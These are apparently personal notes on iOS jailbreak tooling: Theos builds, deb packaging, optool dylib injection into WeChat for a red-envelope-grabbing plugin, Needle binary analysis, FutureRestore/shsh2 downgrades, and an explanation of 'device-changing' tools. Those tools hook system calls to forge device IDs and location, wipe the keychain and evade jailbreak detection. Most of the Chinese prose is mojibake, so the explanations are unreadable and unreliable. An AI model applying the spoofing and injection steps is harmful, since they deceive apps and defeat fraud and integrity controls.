chmod +x /Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/usr/bin/PackageApplication

theos

ARCHS = armv7 armv7s arm64
TARGET = iphone:8.4:7.0
#æŒ‡å®šè·¯å¾„ï¼Œå¦åˆ™é»˜è®¤åœ¨ /Library/MobileSubstrate/DynamicLibraries
LOCAL_INSTALL_PATH = /usr/bin
include theos/makefiles/common.mk
TWEAK_NAME = oooo
oooo_FILES = oooo.xm
#æŒ‡å®šç‰ˆæœ¬
_THEOS_TARGET_LDFLAGS += -current_version 1.0
_THEOS_TARGET_LDFLAGS += -compatibility_version 1.0
#tweak2.mkæ˜¯æˆ‘ä¿®æ”¹è¿‡çš„ï¼Œå»æ‰äº†CydiaSubstrateé“¾æ¥ï¼Œå› ä¸ºè¿™ä¸ªdylibç”¨ä¸åˆ°
include $(THEOS_MAKE_PATH)/tweak2.mk
-current_versionã€-compatibility_versionå‚æ•°å‚è€ƒè‡ªè‹¹æœå®˜æ–¹ï¼ï¼
https://developer.apple.com/library/mac/documentation/DeveloperTools/Conceptual/DynamicLibraries/100-Articles/CreatingDynamicLibraries.html

theosç¼–è¯‘ä¸è¶Šç‹±å¯ç”¨çš„dylib

SUBSTRATE ?= yes
instance_USE_SUBSTRATE = $(SUBSTRATE)
æŠŠä¸Šé¢çš„instanceæ›¿æ¢æˆä½ çš„TweakName
åœ¨ä¸Šé¢çš„è¿™ä¸ªä¾‹å­ä¸­å°±æ˜¯XXXX 
include _USE_SUBSTRATE = noï¼Œè¯·è½¬æ¢ä¸ºä½¿ç”¨include _LOGOS_DEFAULT_GENERATOR = internal
ç¼–è¯‘ï¼šmake SUBSTRATE=no
ç¼–è¯‘DEBï¼šmake SUBSTRATE=no package
ç¼–è¯‘DEBå¹¶å®‰è£…ï¼šmake SUBSTRATE=no package  install

```

## æ‰“åŒ…deb
```
find . -name .DS_Store -print0 | xargs -0 git rm -f --ignore-unmatch
echo .DS_Store >> ~/.gitignore
xcode-select --install 
sudo xcodebuild -license    æ‰‹åŠ¨è¾“å…¥ agree
å®‰è£… Macports ï¼Œç½‘å€ï¼šhttp://www.macports.org/install.php
export PATH=/opt/local/bin:/opt/local/sbin:$PATH
sudo port -f install dpkg
dpkg é™çº§
brew remove dpkg  
HOMEBREW_NO_AUTO_UPDATE=1 brew install https://raw.githubusercontent.com/Homebrew/homebrew-core/7a4dabfc1a2acd9f01a1670fde4f0094c4fb6ffa/Formula/dpkg.rb
brew pin dpkg 
$ brew remove dpkg  
# remove latest dpkg 
$ brew install --force-bottle https://raw.githubusercontent.com/Homebrew/homebrew-core/7a4dabfc1a2acd9f01a1670fde4f0094c4fb6ffa/Formula/dpkg.rb  
# install dpkg as a bottle from the old commit 
$ brew pin dpkg  
# block homebrew from updating dpkg till you `brew unpin dpkg`
postinstå†™æ³•ï¼ˆç›´æ¥å¤åˆ¶)ï¼ˆæƒé™755ï¼‰
#!/bin/bash
mkdir -p /private/var/mobile/Documents/
chown -R mobile:mobile /private/var/mobile/Documents/
/bin/su -c uicache mobile
cd Desktop
sudo chmod -R 755 *
dpkg-deb -Z gzip -b ./{æ ‡è¯†ç¬¦} 
dpkg-deb -Z xz -b ./{æ ‡è¯†ç¬¦}
mac è§£åŒ… æ‰“åŒ…
dpkg-deb -x ./abc.deb ./tmp
dpkg-deb -e ./abc.deb ./tmp/DEBIAN
dpkg-deb -b ./tmp false8.deb
è§£åŒ….sh
#!/bin/sh
dpkg-deb -x ./a.deb ./a
dpkg-deb -e ./a.deb ./a/DEBIAN
chmod -R 755 ./a/DEBIAN
æ‰“åŒ….sh
#!/bin/sh
find . -name '*.DS_Store' -type f -delete
dpkg-deb -Z lzma -b ./a b.deb

```

### optoolç¥å™¨å°±æ˜¯å‘½ä»¤è¡Œæ³¨å…¥
```
optool install -c load -p "@executable_path/RedEnvelop.dylib" -t WeChat
//è¿™å°±æ˜¯ç»™WeChatåŠ è½½æŠ¢çº¢åŒ…æ’ä»¶

//å¦‚æœè¦unstallï¼Œè¦è¿™æ ·ï¼š
optool uninstall -p "@executable_path/RedEnvelop.dylib" -t WeChat

//å…·ä½“ dylib çš„è·¯å¾„å¯ä»¥ç”¨ otool æŸ¥çœ‹ï¼š
otool -L WeChat
```

```
ä½¿ç”¨æ–¹æ³•:

  install -c <command> -p <payload> -t <target> [-o=<output>] [-b] [--resign] In
  serts an LC_LOAD command into the target binary which points to the payload. T
  his may render some executables unusable.

  uninstall -p <payload> -t <target> [-o=<output>] [-b] [--resign] Removes any L
  C_LOAD commands which point to a given payload from the target binary. This ma
  y render some executables unusable.

  strip [-w] -t <target> Removes a code signature load command from the given bi
  nary.

  restore -t <target> Restores any backup made on the target by this tool.

  aslr -t <target> [-o=<output>] [-b] [--resign] Removes an ASLR flag from the m
  acho header if it exists. This may render some executables unusable


å¯é€‰çš„:
  [-w --weak] Used with the STRIP command to weakly remove the signature. Withou
  t this, the code signature is replaced with null bytes on the binary and its L
  OAD command is removed.

  [--resign] Try to repair the code signature after any operations are done. Thi
  s may render some executables unusable.

  -t|--target <target> Required of all commands to specify the target executable
   to modify

  -p|--payload <payload> Required of the INSTALL and UNINSTALL commands to speci
  fy the path to a DYLIB to point the LOAD command to

  [-c --command] Specify which type of load command to use in INSTALL. Can be re
  export for LC_REEXPORT_DYLIB, weak for LC_LOAD_WEAK_DYLIB, upward for LC_LOAD_
  UPWARD_DYLIB, or load for LC_LOAD_DYLIB

  [-b --backup] Backup the executable to a suffixed path (in the form of _backup
  .BUNDLEVERSION)

  [-h --help] Show this message

```

## -----------------------------------

## è§£é™¤ç½‘é¡µç¦æ­¢å¤åˆ¶ç²˜è´´

å¦‚æœå‘ç°ç½‘é¡µæ— æ³•é€‰æ‹©æ–‡å­—,
æ‰¾åˆ°ä½ è¦å¤åˆ¶æ–‡å­—çš„åœ°æ–¹,
æ˜¾ç¤ºæºä»£ç : 
æ‰¾åˆ°-webkit-user-selectå­—æ®µ
```
-webkit-user-select: none
```
å¦‚æœæœ‰ï¼Œå°†å…¶å»æ‰ä¿å­˜åˆ·æ–°

## -----------------------------------

## Needleç»•è¿‡iOSè¶Šç‹±æ£€æµ‹

### Needleä½¿ç”¨æ•™ç¨‹

ç”±äºæ¯ä¸ªæ¨¡å—éƒ½ä¸“æ³¨äºç‰¹å®šä»»åŠ¡ï¼Œå¹¶ä¸”æ ¸å¿ƒå¤„ç†å¸¸è§é—®é¢˜ï¼ˆä¾‹å¦‚ä¸è®¾å¤‡çš„é€šä¿¡ï¼Œå‘½ä»¤çš„å®é™…æ‰§è¡Œç­‰ï¼‰ï¼Œå› æ­¤åˆ›å»ºæ–°æ¨¡å—åªéœ€å‡ è¡Œpythonä»£ç å³å¯ã€‚

â€œ show modulesâ€å‘½ä»¤å¯ç”¨äºåˆ—å‡ºæ¡†æ¶ä¸­å½“å‰å¯ç”¨çš„æ‰€æœ‰æ¨¡å—ã€‚

[needle][install] > show modules

Binary
  ------
    binary/info/checksums
    binary/info/compilation_checks
    binary/info/metadata
    binary/info/provisioning_profile
    binary/info/universal_links
    binary/installation/install
    binary/installation/pull_ipa
    binary/reversing/class_dump
    binary/reversing/class_dump_frida_enum-all-methods
    binary/reversing/class_dump_frida_enum-classes
    binary/reversing/class_dump_frida_find-class-enum-methods
    binary/reversing/shared_libraries
    binary/reversing/strings

  Comms
  -----
    comms/certs/delete_ca
    comms/certs/export_ca
    comms/certs/import_ca
...
å¦åˆ™ï¼Œâ€œ search <query>â€å‘½ä»¤å¯ç”¨äºæœç´¢ä¸æŸ¥è¯¢åŒ¹é…çš„å¯ç”¨æ¨¡å—ã€‚

[needle] > search binary
[*] Searching for "binary"...

Binary
------
    binary/info/checksums
    binary/info/compilation_checks
    binary/info/metadata
    binary/info/provisioning_profile
    binary/info/universal_links
    binary/installation/install
    binary/installation/pull_ipa
    binary/reversing/class_dump
    binary/reversing/class_dump_frida_enum-all-methods
    binary/reversing/class_dump_frida_enum-classes
    binary/reversing/class_dump_frida_find-class-enum-methods
    binary/reversing/shared_libraries
    binary/reversing/strings

Storage
-------
    storage/data/files_binarycookies 
é€‰æ‹©åï¼Œâ€œ infoâ€å‘½ä»¤å¯ç”¨äºæ˜¾ç¤ºç‰¹å®šæ¨¡å—çš„è¯¦ç»†ä¿¡æ¯ã€‚

[needle] > use binary/reversing/strings
[needle][strings] > info

Name: Strings
Path: modules/binary/reversing/strings.py
Author: @LanciniMarco (@MWRLabs)

Description:
Find strings in the (decrypted) application binary, then try to extract URIs and ViewControllers

```
Options:
 Name     Current Value                    Required   Description
 -------  -------------                    --------   -----------
 ANALYZE  True                             no         Analyze recovered strings and try to recover URI
 FILTER                                    no         Filter the output (grep)
 LENGTH   10                               yes        Minimum length for a string to be considered
 OUTPUT   /root/.needle/tmp/strings.txt    no         Full path of the output file 
æˆ–è€…ï¼Œä»…è·å–å¯ç”¨é€‰é¡¹ï¼š

[needle][strings] > show options
 Name     Current Value                    Required   Description
 -------  -------------                    --------   -----------
 ANALYZE  True                             no         Analyze recovered strings and try to recover URI
 FILTER                                    no         Filter the output (grep)
 LENGTH   10                               yes        Minimum length for a string to be considered
 OUTPUT   /root/.needle/tmp/strings.txt    no         Full path of the output file 
åƒå…¨å±€é€‰é¡¹ä¸€æ ·ï¼Œç”šè‡³æ¨¡å—ç‰¹å®šçš„é€‰é¡¹ä¹Ÿå¯ä»¥ä½¿ç”¨â€œ setâ€å’Œâ€œ unsetâ€å‘½ä»¤è¿›è¡Œç¼–è¾‘ã€‚

[needle][strings] > set FILTER password
FILTER => password
[needle][strings] > show options
 Name     Current Value                    Required   Description
 -------  -------------                    --------   -----------
 ANALYZE  True                             no         Analyze recovered strings and try to recover URI
 FILTER   password                         no         Filter the output (grep)
 LENGTH   10                               yes        Minimum length for a string to be considered
 OUTPUT   /root/.needle/tmp/strings.txt    no         Full path of the output file 
å½“æ‰€æœ‰é€‰é¡¹å‡è®¾ç½®ä¸ºé¦–é€‰æ—¶ï¼Œâ€œ runâ€å‘½ä»¤å¯ç”¨äºå¯åŠ¨æ¨¡å—çš„æ‰§è¡Œã€‚å¦‚æœå°šæœªé€‰æ‹©ç›®æ ‡åº”ç”¨ç¨‹åºï¼ˆå…¨å±€é€‰é¡¹â€œ TARGET_APPâ€ä»æœªè®¾ç½®ï¼‰ï¼ŒNeedleå°†é¦–å…ˆå¯åŠ¨å‘å¯¼ï¼Œè¯¥å‘å¯¼å°†å¸®åŠ©ç”¨æˆ·é€‰æ‹©ç›®æ ‡ã€‚

[needle][strings] > run
[*] Checking connection with device...
[+] Already connected to: 127.0.0.1
[V] Creating temp folder: /var/root/needle/
[*] Target app not selected. Launching wizard...
[V] Refreshing list of installed apps...
[+] Apps found:
    0 - com.highaltitudehacks.dvia
    1 - uk.co.bbc.newsuk
Please select a number: 0
[+] Target app: com.highaltitudehacks.dvia
[*] Decrypting the binary...
[?] The app might be already decrypted. Trying to retrieve the IPA...
[V] Decrypted IPA stored at: /var/root/needle/decrypted.ipa
[*] Unpacking the decrypted IPA...
[V] Analyzing binary...
[+] The following strings has been found: 
     %@: Unable to get password of credential %@
     %s -- Cannot be used in OpenSSL mode. An IV or password is required
     Both password and the key (%d) or HMACKey (%d) are set.
     CFHTTPMessageAddAuthentication(httpMsg, _responseMsg, (__bridge CFStringRef)_credential.user, (__bridge CFStringRef)password, kCFHTTPAuthenticationSchemeBasic, _httpStatus == 407)
     Cannot sign up without a password.
     Congrats! You've found the right username and password!
     Huh, couldn't get password of %@; trying again
     Please enter a password
     T@"NSString",&,N,V_password
     T@"NSString",C,N,V_password
     T@"UITextField",&,N,V_passwordTextField
     ...
[*] Saving output to file: /root/.needle/tmp/strings.txt
æœ€åï¼Œâ€œ show sourceâ€å‘½ä»¤å¯ç”¨äºæ£€æŸ¥æ‰€é€‰æ¨¡å—çš„å®é™…æºä»£ç ã€‚

[needle][strings] > show source

 1|from core.framework.module import BaseModule
 2|
 3|
 4|class Module(BaseModule):
 5|    meta = {
 6|           'name': 'Strings',
 7|           'author': '@LanciniMarco (@MWRLabs)',
 8|           'description': 'Find strings in the (decrypted) application binary, then try to extract URIs and ViewControllers',
 9|           'options': (
10|                      ('length', 10, True, 'Minimum length for a string to be considered'),
11|                      ('filter', '', False, 'Filter the output (grep)'),
12|                      ('output', True, False, 'Full path of the output file'),
13|                      ('analyze', True, False, 'Analyze recovered strings and try to recover URI'),
14|          ),
15|    }
16|
17|    # ====================================================================
18|    # UTILS
19|    # ====================================================================
20|    def __init__(self, params):
21|        BaseModule.__init__(self, params)
```

```
Signing for "xxx" requires a development team. 
Select a development team in the Signing & Capabilities editor. 
(in target 'xxxDylib' from project 'xxx')

ä½¿ç”¨monkeydevåŠ¨æ€è°ƒè¯•å·¥å…·ï¼Œxcodeæ–°å»ºæ–‡ä»¶ä¹‹åç¼–è¯‘ä¸€ç›´æŠ¥é”™è¯ä¹¦é—®é¢˜ï¼Œ æ— è®ºæ€ä¹ˆä¿®æ”¹è¯ä¹¦ä¸ºå¼€å‘å›¢é˜Ÿä¹Ÿä¸è¡Œã€‚
è§£å†³æ–¹æ¡ˆï¼š

target é€‰æ‹©xxxDylib buildsetting æ·»åŠ CODE_SIGNING_ALLOWEDï¼Œè®¾ç½®ä¸º=NO

```

## iOSæ”¹æœºåŸç†æ˜¯ä»€ä¹ˆ?
```
åœ¨iOSä¸Šç›®å‰æ‰€æœ‰æµè¡Œçš„æ”¹æœºå·¥å…·ï¼Œæœ¬è´¨ä¸Šæ˜¯åˆ©ç”¨substrateæ¡†æ¶å¯¹æŸäº›ç”¨æ¥è·å–è®¾å¤‡å’Œç³»ç»Ÿå‚æ•°å‡½æ•°è¿›è¡Œhookï¼Œ
ä»è€Œæ¬ºéª—Appè¾¾åˆ°ä¿®æ”¹çš„ç›®çš„ï¼Œå…·ä½“çš„å¦‚ä¸‹ï¼š

ç”¨ä½œè·å–è®¾å¤‡å‚æ•°çš„å‡½æ•°(æ— è®ºæ˜¯Cå‡½æ•°ï¼Œè¿˜æ˜¯Objective-C/Swiftå‡½æ•°ï¼Œå¯ä»¥ä½¿ç”¨hookæ¡†æ¶æ¥ä¿®æ”¹å…¶è¿”å›å€¼)
å±è”½VPNï¼HTTPä»£ç†æ£€æµ‹
å±è”½è¶Šç‹±æ£€æµ‹
```

## ä¸€é”®æ–°æœºæ€ä¹ˆå®ç°çš„?
```
åœ¨è¿›è¡Œä¸€é”®æ–°æœºæ—¶, æ“ä½œå¦‚ä¸‹ï¼š

ç”Ÿæˆè®¾å¤‡å‚æ•°å¹¶ä¿å­˜åˆ°æ–‡ä»¶
/private/var/mobile/Library/Preferences/
com.app1e.mobile.ifalscommon.plist   ä¿å­˜ä¼ªé€ è®¾å¤‡å‚æ•°æ•°æ®
com.app1e.mobile.ifalslocation.plist ä¿å­˜ä¼ªé€ ä½ç½®æ•°æ®

å°†åº”ç”¨æ²™ç›’ç›®å½•ä¸‹çš„æ•°æ®å¤‡ä»½ï¼ŒåŒæ—¶ä¸ºæ–°ç¯å¢ƒåˆ›å»ºæ²™ç›’ç›®å½•ç»“æ„
å¤‡ä»½çš„æ•°æ®å­˜æ”¾åœ¨/private/var/mobile/fackedataä¸‹

åº”ç”¨å¯åŠ¨åï¼Œfackedata.dylibä¼šhookå…³é”®å‡½æ•°ï¼Œå¹¶æ ¹æ®plistæ–‡ä»¶ä¿®æ”¹å‡½æ•°è¿”å›çš„æ•°æ®
åœ¨è¿™ä¸€æ­¥ï¼Œfackedataè¿˜ä¼šæ ¹æ®æƒ…å†µæ¸…ç†keychain, åŒæ—¶åšç®€å•çš„åè¶Šç‹±æ£€æµ‹
```

## FutureRestore GUIç•Œé¢åŒ–é™çº§æ•™ç¨‹

FutureRestore GUIæä¾›äº†ä¸ç»å…¸å‘½ä»¤è¡Œç•Œé¢ç‰ˆæœ¬ç›¸åŒçš„åŠŸèƒ½ï¼Œ
ä½†æ˜¯å¯ä»¥é€šè¿‡ç•Œé¢åŒ–æ¥å•å‡»æŒ‰é’®æ¥å¯åŠ¨è¯¥è¿‡ç¨‹ï¼Œè€Œä¸æ˜¯ä½¿ç”¨Terminalå‘½ä»¤ã€‚
é€‚ç”¨äºå°ç™½æ–°æ‰‹å¾ˆæ–¹ä¾¿, æ‘†è„±å‘½ä»¤è¡Œ, å¿«é€Ÿæ“ä½œshsh2æ¥é™çº§iOSå›ºä»¶

FutureRestore GUIåº”ç”¨ç¨‹åºä»ç„¶è¦æ±‚ç”¨æˆ·æ‹¥æœ‰ä»–ä»¬è®¡åˆ’é™çº§æˆ–å‡çº§åˆ°çš„ç‰ˆæœ¬çš„.shsh2 blobå’Œ.ipswå›ºä»¶æ–‡ä»¶ã€‚
å¯¹futurerestoreçš„å‘½ä»¤è¡Œç•Œé¢ç‰ˆæœ¬çš„æ‰€æœ‰ç›¸åŒé™åˆ¶å’Œé™åˆ¶ä»ç„¶é€‚ç”¨ï¼Œå› æ­¤æˆ‘ä»¬é¼“åŠ±è¶Šç‹±è€…ä¸ºæ­¤ç›®çš„ä¿å­˜å¯¹åº”çš„.shsh2 blobã€‚

## QQç¾¤æ–‡ä»¶ä¸‹è½½å·¥å…·

![](https://mmbiz.qpic.cn/mmbiz_png/Rgn7gtr1jyqKh0AB6YGjnVYeogcNvBUBVN7tJ0ku95RxVIWMeTiaXkypqPiaiczpd7MuCmsvCsicwjS2lwdYmNUelw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

é¢å¤–å¤„ç†A12 +è®¾å¤‡ä¿å­˜shsh2æ•™ç¨‹

å°†ä»¥ä¸‹å­˜å‚¨åº“æ·»åŠ åˆ°æ‚¨çš„è®¾å¤‡ï¼š

https://halo-michael.github.io/repo
å¹¶å®‰è£…åä¸ºGenerator Auto Setterçš„è½¯ä»¶åŒ… ã€‚å®‰è£…åï¼Œåœ¨â€œè®¾ç½®â€ åº”ç”¨ä¸­è¿›è¡Œè°ƒæ•´ï¼Œæ‰¾åˆ°â€œç”Ÿæˆå™¨è‡ªåŠ¨è®¾ç½®å™¨â€ï¼Œè¾“å…¥æ‚¨é€‰æ‹©çš„ç”Ÿæˆå™¨ï¼Œç„¶åé€‰æ‹©â€œ è®¾ç½®â€ã€‚

![](https://mmbiz.qpic.cn/mmbiz_jpg/Rgn7gtr1jyqKh0AB6YGjnVYeogcNvBUBhAiclOKMWdE4FwhIr2ichzUMNTT0PqnnibNuBuENUf5yHIQibIRo2d7XUw/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

è¯·æ³¨æ„ï¼Œè®¾ç½®ä»€ä¹ˆå‘ç”Ÿå™¨éƒ½æ²¡æœ‰å…³ç³»ã€‚é‡è¦çš„æ˜¯ï¼Œåœ¨å‘ç°åŒ¹é…çš„Apnonceä¹‹å‰ï¼Œ æ‚¨å¿…é¡»çŸ¥é“è®¾ç½®äº†å“ªä¸ªç”Ÿæˆå™¨ã€‚ä»–ä»¬æˆå¯¹ï¼Œæ›´æ¢å‘ç”µæœºä¼šæ”¹å˜Apnonceã€‚æˆ‘ä»¬éœ€è¦çŸ¥é“æ˜¯ä»€ä¹ˆç”Ÿæˆå™¨åˆ›å»ºäº†Apnonceï¼Œæˆ‘ä»¬å°†åœ¨åç»­æ­¥éª¤ä¸­å‘ç°å®ƒä»¬ã€‚

è®¸å¤šç”Ÿæˆå™¨è®¾ç½®å™¨ä½¿ç”¨é»˜è®¤å€¼ã€‚ä¾‹å¦‚ï¼Œé»˜è®¤æƒ…å†µä¸‹unc0verå’ŒGenerator Auto Setter éƒ½ä½¿ç”¨0x1111111111111111ã€‚æ‚¨çš„å‘ç”µæœºè®¾ç½®å™¨å¯èƒ½ä½¿ç”¨å…¶ä»–å€¼ã€‚æ‚¨å¯ä»¥å°†ç”Ÿæˆå™¨è®¾ç½®ä¿ç•™ä¸ºé»˜è®¤å€¼ï¼ˆæ¨èï¼‰ï¼Œä¹Ÿå¯ä»¥æ›´æ”¹å®ƒã€‚ä¸ç®¡å®ƒä¸ åªè¦ä½ çŸ¥é“ä½ å·²ç»å°†å®ƒè®¾ç½®ä¸ºï¼Œå¹¶è®°ä¸‹æ¥ã€‚

å°†è¶Šç‹±è®¾å¤‡ä¸Šçš„ç”Ÿæˆå™¨æˆåŠŸè®¾ç½®ä¸ºå·²çŸ¥å€¼ï¼ˆä¾‹å¦‚0x1111111111111111ï¼‰å¹¶å°†è®¾å¤‡æ’å…¥è®¡ç®—æœºåï¼Œæˆ‘ä»¬å¯ä»¥ç»§ç»­è¿›è¡Œã€‚

è¯·è®°ä½ï¼šçŸ¥é“æ‚¨çš„ç”Ÿæˆå™¨å€¼æ˜¯ä»€ä¹ˆï¼Œå¹¶åœ¨å°†æ¥å®‰å…¨çš„åœ°æ–¹ï¼ˆä¾‹å¦‚æ–‡æœ¬æ–‡æ¡£ï¼‰è®°å½•ä¸‹æ¥ï¼å¦‚æœæ‚¨ä¸å†çŸ¥é“ç”¨æ¥åˆ›å»ºApnonceçš„ç”Ÿæˆå™¨ï¼ˆç”¨äºä¿å­˜Blobï¼‰ï¼Œåˆ™SHSH Blobå°†æ— æ•ˆã€‚

## Macæ‰“å¼€ Terminal è¿è¡Œ commands:
```
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
```

ç„¶åå®‰è£…libirecovery
```
brew install --HEAD usbmuxd
brew install --HEAD libimobiledevice
brew install libirecovery
```

ç„¶åæ‰“å¼€ä¸€ä¸ªç»ˆç«¯çª—å£ã€‚åœ¨Windowsä¸Šï¼Œåœ¨è¿è¡Œä»¥ä¸‹å‘½ä»¤ä¹‹å‰ï¼Œæ‚¨è¿˜éœ€è¦å¯¼èˆªåˆ°ä¸‹è½½çš„äºŒè¿›åˆ¶æ–‡ä»¶çš„å­˜å‚¨ä½ç½®ã€‚

å¦‚æœè¿™äº›å‘½ä»¤ä¸­çš„ä»»ä½•ä¸€ä¸ªåœ¨Macæˆ–Linuxä¸Šå¤±è´¥ï¼Œè¯·å°è¯•åœ¨å‘½ä»¤å‰é¢åŠ ä¸Šsudo æ¥è¿è¡Œ å®ƒä»¬ã€‚è¾“å…¥ä»¥ä¸‹å†…å®¹ï¼š

ç°åœ¨è¾“å…¥ï¼š
```
ideviceenterrecovery UDID

```
å°†UDIDæ›¿æ¢ä¸ºæ‚¨åœ¨ä¸Šä¸€æ­¥ä¸­è®°ä¸‹çš„UniqueDeviceIDï¼ˆä¸€é•¿ä¸²æ•°å­—å’Œå­—æ¯ï¼‰ã€‚æ‚¨çš„è®¾å¤‡ç°åœ¨å°†é‡æ–°å¯åŠ¨è¿›å…¥æ¢å¤æ¨¡å¼ï¼Œå¹¶ä¸”æ‚¨åº”è¯¥åœ¨å±å¹•ä¸Šçœ‹åˆ°éšé™„çš„å›¾å½¢ã€‚

ç°åœ¨è¾“å…¥ï¼š
```
irecovery -q
```

æ‚¨åº”è¯¥çœ‹åˆ°è®¾å¤‡çš„å¦ä¸€ä¸ªå€¼åˆ—è¡¨ã€‚æ‚¨å°†éœ€è¦å¤åˆ¶ECID ï¼ˆè¿™æ˜¯è®¾å¤‡çš„ECIDï¼Œæ¯æ¬¡ä¿å­˜Blobæ—¶éƒ½éœ€è¦ï¼‰å’ŒNONC ï¼ˆè¿™æ˜¯æˆ‘ä»¬å·²ç»å¬åˆ°å¾ˆå¤šæ¬¡çš„è‡³å…³é‡è¦çš„Apnonceï¼Œå¹¶ä¸”ä¸ç”Ÿæˆå™¨å”¯ä¸€é…å¯¹ï¼‰çš„å€¼è®¾ç½®å¾—æ›´æ—©ï¼‰ã€‚

è¯·åœ¨å®‰å…¨çš„åœ°æ–¹è®°ä¸‹è¿™äº›å€¼ï¼Œä¾‹å¦‚åœ¨ä¹‹å‰ä¿å­˜äº†ç”Ÿæˆå™¨ï¼ŒHardwareModelå’ŒProductTypeçš„æ–‡æœ¬æ–‡æ¡£ä¸­ã€‚ä»¥åæ¯æ¬¡ä¿å­˜shsh2æ—¶ï¼Œéƒ½å°†éœ€è¦å®ƒä»¬ã€‚

æœ€åï¼Œè¾“å…¥ï¼š
```
irecovery -n
```

è¿™ä¼šå°†æ‚¨çš„è®¾å¤‡é‡æ–°å¯åŠ¨ï¼Œä½¿å…¶é€€å‡ºæ¢å¤æ¨¡å¼ã€‚è¯·å‹¿ä½¿ç”¨ç‰©ç†æŒ‰é’®é‡æ–°å¯åŠ¨è®¾å¤‡ï¼Œå› ä¸ºå®ƒå°†å§‹ç»ˆè¿”å›åˆ°æ¢å¤æ¨¡å¼ã€‚è¯·æ”¹ç”¨æ­¤å‘½ä»¤ã€‚

```
ç¡¬ä»¶å‹å·ï¼ˆä¹‹å‰ç§°ä¸º HardwareModelï¼‰
è®¾å¤‡å‹å·ï¼ˆä¹‹å‰ç§°ä¸º ProductTypeï¼‰
è®¾å¤‡ECIDï¼ˆå­—æ¯æ•°å­—å­—ç¬¦ä¸²ï¼Œå¯èƒ½ä»¥0xå¼€å¤´...ï¼‰
ç”Ÿæˆå™¨ï¼ˆç”±æ‚¨åœ¨å¼€å§‹æ—¶è®¾ç½®ï¼Œä¾‹å¦‚0x1111111111111111ï¼‰
Apnonceï¼ˆé•¿å­—æ¯æ•°å­—å­—ç¬¦ä¸²ï¼Œä»…å¯¹æ‚¨åœ¨ä¸Šé¢è®¾ç½®çš„ç”Ÿæˆå™¨æœ‰æ•ˆï¼‰
```

ç°åœ¨ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨TSS Saverä¸ºæ‚¨çš„A12 +è®¾å¤‡ä¿å­˜.shsh2 blobã€‚ä»¥åæ— éœ€é‡å¤ä»¥ä¸Šæ“ä½œå³å¯ä¿å­˜è¯¥è®¾å¤‡çš„Blobã€‚ä¸ºäº†ä¿å­˜Blobï¼Œæ‚¨ç”šè‡³ä¸å¿…å¯¹å…¶è¿›è¡Œè¶Šç‹±

![](https://mmbiz.qpic.cn/mmbiz_jpg/Rgn7gtr1jyofHOIOrF8zA2HfBYUf7cqsBLEdOHp4ia0T7eBehVhicYlicwNFePhfujH2qDBSGDwSp9geM6TAial74w/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)
```
å› ä¸ºè¿™ä¸ªFutureRestore GUIæ˜¯åŸºäºJavaæ¥å¼€å‘çš„
æ‰€ä»¥ç”¨æˆ·éœ€è¦åœ¨MacOSä¸Šå®‰è£…Java 8æ‰èƒ½ä½¿ç”¨å®ƒ
https://www.java.com/en/download/
```

## shsh2æ˜¯ä»€ä¹ˆï¼Ÿ
```
APTicketæ˜¯ä»iOS5å¼€å§‹ç”±è‹¹æœæ¨å‡ºçš„æœ€æ–°å®‰å…¨æ£€æŸ¥åŠŸèƒ½ï¼Œæœ€ä¸»è¦åŠŸèƒ½æ˜¯é˜²æ­¢iPhoneã€iPadã€iPodç”¨æˆ·è®¾å¤‡æ£€éªŒçš„é™çº§é™åˆ¶ï¼Œç›®å‰ä¹Ÿä»…æœ‰Apple Serveræ‰èƒ½æ‹¥æœ‰å‘é€ä¸è§£å¼€  APTicket å¯†é’¥ï¼Œé‚£  APTicket æ€ä¹ˆè·å¾—å‘¢ï¼Ÿ

åœ¨æˆ‘ä»¬è®¾å¤‡æ‰‹ä¸Šçš„è®¾å¤‡éƒ½ä¼šæœ‰ä¸€ç»„å›ºå®šçš„16ç ECIDï¼ˆExclusive Chip IDï¼‰å·ç ï¼Œå½“æˆ‘ä»¬è¦é€è¿‡iTunesè¿›è¡Œå‡é™çº§æ—¶ï¼Œä¼šå…ˆè¿è‡³è‹¹æœéªŒè¯æœåŠ¡å™¨ï¼ˆgs.apple.comï¼‰ï¼Œä¸¢å‡ºã€Œè®¯æ¯ã€å†…ä¼šå¤¹å¸¦ä¸€æ¬¡æ€§å”¯ä¸€ç ã€è®¾å¤‡ECIDä¸19ä¸ªBLOBçš„éªŒè¯ç ï¼Œè€ŒæœåŠ¡å™¨æ¥æ”¶åˆ°åï¼Œå°±ä¼šè¿”å›ä¸€ç»„éšæœºAPTicketå’Œå½“å‰iOSç‰ˆæœ¬çš„SHSHéªŒè¯ç ï¼Œå½“éªŒè¯ç¬¦åˆæ—¶ï¼Œæ‰èƒ½å¤Ÿè¿›è¡Œæ¥ä¸‹æ¥çš„å‡é™çº§åŠ¨ä½œã€‚

æ‰€ä»¥åœ¨iOSéªŒè¯å…³é—­åï¼Œå°±ç®—ä½ æœ‰å¤‡ä»½SHSHå…¶å®ä¹Ÿæ— æ³•å®ç°é™çº§ï¼Œå› ä¸ºè¿˜æœ‰  APTicketéªŒè¯è¦è§£å†³ã€‚

åœ¨32ä½å…ƒè®¾å¤‡ä¸­ï¼Œæœ‰å­˜æœ‰ç¡¬ä½“è®¾å¤‡æ¼æ´ï¼Œå¯ç›´æ¥ç»•è¿‡  APTicket éªŒè¯ï¼Œç›´æ¥å®ç°é SHSHå°±å¯ä»¥é™çº§ã€‚ä¹Ÿæœ‰ä¸€æ¬¾é™çº§å·¥å…·ã€ŒodysseusOTAã€æ¨å‡ºåï¼Œå°±èƒ½å¤Ÿè®©ä¸å°‘32ä½å…ƒè®¾å¤‡ï¼Œå¦‚iPhone5ã€5cã€4sã€iPad3ã€iPad2éƒ½èƒ½é™å›è‡³æ—§  iOSç‰ˆæœ¬ä¸Šã€‚

ç›®å‰æˆ‘ä»¬è¿˜å¯ä»¥å¤‡ä»½  SHSH å—ï¼Ÿå‰æè¦å†  SHSH è®¤è¯å¼€å¯çŠ¶æ€ä¸‹æ‰èƒ½å¤Ÿç”¨tsscheckerå·¥å…·å¤‡ä»½ã€‚

shsh2æ˜¯ä»€ä¹ˆï¼Ÿæœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿ

